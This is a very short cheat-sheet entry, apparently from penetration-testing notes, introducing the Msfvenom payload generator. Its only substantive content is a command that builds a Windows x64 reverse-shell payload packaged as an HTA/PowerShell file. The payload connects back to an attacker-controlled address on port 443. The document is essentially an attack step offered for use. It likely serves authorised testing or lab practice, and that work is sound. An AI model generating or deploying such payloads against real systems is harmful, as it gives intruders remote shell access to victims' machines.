

# Msfvenom
Msfvenom is a standalone payload generator.



# Create a reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.56.2 LPORT=443 -f hta-psh -o payload.hta